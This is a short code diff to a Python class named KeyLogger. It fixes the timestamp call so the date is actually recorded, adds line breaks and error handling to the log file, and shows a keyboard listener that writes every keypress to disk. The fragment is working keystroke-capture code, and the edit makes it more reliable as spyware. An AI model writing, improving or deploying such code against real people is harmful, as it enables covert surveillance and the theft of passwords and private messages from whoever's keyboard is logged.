@@ -29,14 +29,15 @@ class KeyLogger:
 
     def pressed_key(self, key):
         """if a key is presses , this function will be called and it will write data."""
-        with open(self.filename, 'a') as logs:
-            logs.write('{0} {1}'.format(str(datetime.datetime.now),str(key)))
+        with open(self.filename, 'a',errors='ignore') as logs:
+            logs.write('{0} {1}\n'.format(str(datetime.datetime.now()),str(key)))
 
     def start(self):
         """starting point of keylogger."""
         global listener
         listener = keyboard.Listener(on_press=self.pressed_key,)
         listener.start()
+        
 
     def stop(self):
         """stops listener"""
